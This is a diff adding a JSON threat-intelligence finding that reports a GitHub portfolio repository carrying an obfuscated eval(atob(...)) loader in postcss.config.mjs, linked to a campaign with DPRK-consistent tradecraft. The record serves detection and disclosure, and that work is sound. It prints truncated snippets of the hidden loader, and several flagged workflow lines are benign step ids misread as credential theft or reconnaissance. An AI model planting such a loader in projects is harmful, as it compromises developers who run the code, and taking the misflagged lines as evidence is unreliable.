@@ -1,0 +1,117 @@
+{
+  "finding": {
+    "key": "repository:usmanaliashraf/portfolio",
+    "kind": "repository",
+    "family": "",
+    "id": "usmanaliashraf/portfolio",
+    "url": "https://github.com/UsmanAliAshraf/Portfolio",
+    "registry": "github",
+    "owner": "usmanaliashraf",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 12,
+    "detection_method": "signature_match",
+    "attribution": "DPRK (North Korea) (per OSM)",
+    "campaign_id": "GW-C-e0be6a21",
+    "rules": "obfuscation/eval-decoded; credential_harvest/env-token-grab; enumeration/host-recon; obfuscation/atob",
+    "evidence_locations": "postcss.config.mjs:12; .github\\workflows\\nextjs.yml:15; .github\\workflows\\nextjs.yml:19; .github\\workflows\\nextjs.yml:35; .github\\workflows\\nextjs.yml:92; .github\\workflows\\publish.yml:11; .github\\workflows\\publish.yml:51; .github\\workflows\\setup-node\\action.yml:13",
+    "c2_hosts": "",
+    "iocs": "postcss.config.mjs",
+    "matched_signatures": "Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm",
+    "reasons": "Shares a confirmed-malware code signature ['Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm'] | Tier-2 confirmed (bash score 12)",
+    "osm_status": "submitted",
+    "osm_threat_id": "13c6ed4f-4f8d-4a24-90cd-6b8f7ee1019f",
+    "first_seen": "hunt-20260620T052811Z",
+    "last_seen": "hunt-20260620T052811Z",
+    "evidence_file": "repositories/usmanaliashraf_portfolio.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "postcss.config.mjs",
+      "line": 12,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "export default config;eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-90"
+    },
+    {
+      "file": ".github\\workflows\\nextjs.yml",
+      "line": 15,
+      "category": "credential_harvest",
+      "rule": "env-token-grab",
+      "snippet": "# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages"
+    },
+    {
+      "file": ".github\\workflows\\nextjs.yml",
+      "line": 19,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "id-token: write"
+    },
+    {
+      "file": ".github\\workflows\\nextjs.yml",
+      "line": 35,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "id: detect-package-manager"
+    },
+    {
+      "file": ".github\\workflows\\nextjs.yml",
+      "line": 92,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "id: deployment"
+    },
+    {
+      "file": ".github\\workflows\\publish.yml",
+      "line": 11,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "id-token: write"
+    },
+    {
+      "file": ".github\\workflows\\publish.yml",
+      "line": 51,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "id: deployment"
+    },
+    {
+      "file": ".github\\workflows\\setup-node\\action.yml",
+      "line": 13,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "id: cache_dependencies"
+    },
+    {
+      "file": "postcss.config.mjs",
+      "line": 12,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "export default config;eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-90"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/usmanaliashraf/portfolio",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in postcss.config.mjs.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-e0be6a21: one of 11 confirmed repos across 4 accounts sharing the loader stub b10bafdcfe.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: postcss.config.mjs\n- postcss.config.mjs:12: decodes a hidden blob and executes it at load time (obfuscated loader)\n- postcss.config.mjs:12: hides code in an encoded blob that is decoded and run",
+    "publisher": "usmanaliashraf",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/usmanaliashraf/portfolio/blob/HEAD/postcss.config.mjs#L12\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\nextjs.yml#L15\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\nextjs.yml#L19\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\nextjs.yml#L35\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\nextjs.yml#L92\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\publish.yml#L11\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\publish.yml#L51\nhttps://github.com/usmanaliashraf/portfolio/blob/HEAD/.github\\workflows\\setup-node\\action.yml#L13",
+    "verified_iocs": "postcss.config.mjs",
+    "contributors": [],
+    "first_seen": "2026-06-20T05:28:11Z",
+    "last_seen": "2026-06-20T05:28:11Z"
+  }
+}
